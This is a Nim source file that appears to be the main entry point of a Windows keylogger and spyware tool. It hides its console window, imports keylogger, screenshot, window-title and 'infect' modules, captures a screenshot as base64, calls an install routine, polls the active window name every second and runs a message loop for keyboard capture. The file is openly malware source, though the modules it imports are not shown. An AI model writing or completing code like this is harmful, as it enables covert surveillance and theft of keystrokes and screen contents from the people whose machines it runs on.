# hide the console window
const isProd {.booldefine.}: bool = false

import winim

# am pus asta doar ca sa testez func
# import lib/functions/infect
# infect()

when isProd:
  from lib/functions/beforeStart import run
  run()

import lib/functions/keylogger
import asyncdispatch

import lib/functions/getWindowName
import lib/functions/screenshot
let base64Ss: string = screenshot()

# writeFile("base64.tmp.txt", base64Ss)

## TODO: terimina asta
install()


proc main() {.async.} =
  echo getWindowName()
  await sleepAsync(1000)
  asyncCheck main()

asyncCheck main()

# runForever()

var msg: MSG

while GetMessage(addr msg, 0, 0, 0):
  TranslateMessage(addr msg)
  DispatchMessage(addr msg)
